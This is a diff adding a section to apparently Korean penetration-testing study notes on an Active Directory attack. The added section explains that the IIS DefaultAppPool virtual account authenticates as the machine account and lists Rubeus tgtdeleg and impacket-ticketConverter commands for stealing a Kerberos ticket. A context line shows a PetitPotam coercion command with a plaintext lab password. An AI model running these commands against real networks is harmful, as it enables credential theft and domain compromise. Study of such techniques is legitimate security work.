@@ -1074,3 +1074,22 @@ nxc smb 192.168.115.185 -u scarter -p Passw0rd -M coerce_plus -o METHOD=PetitPot
 ```
 
 </details>
+
+---
+<details>
+ <summary><strong>IIS APPPOOL\DefaultAppPool</strong></summary>
+
+- Microsoft Virtual Account의 특징.
+- 로컬에서는 가상 계정으로, 네트워크에서는 머신 계정으로 바뀜.
+- 도메인에 속한 것이 확인되어 티켓 발행 가능.
+<img width="1202" height="85" alt="image" src="https://github.com/user-attachments/assets/4b1b4c79-5e65-4f0f-84f9-eb779dbce67d" />
+<img width="1202" height="180" alt="image" src="https://github.com/user-attachments/assets/85ddee70-f086-41d8-a67d-2fe29b1fd8d5" />
+
+```powershell
+.\rubeus.exe tgtdeleg /nowrap
+
+impacket-ticketConverter ticket.kirbi ticket.ccache
+```
+
+
+</details>
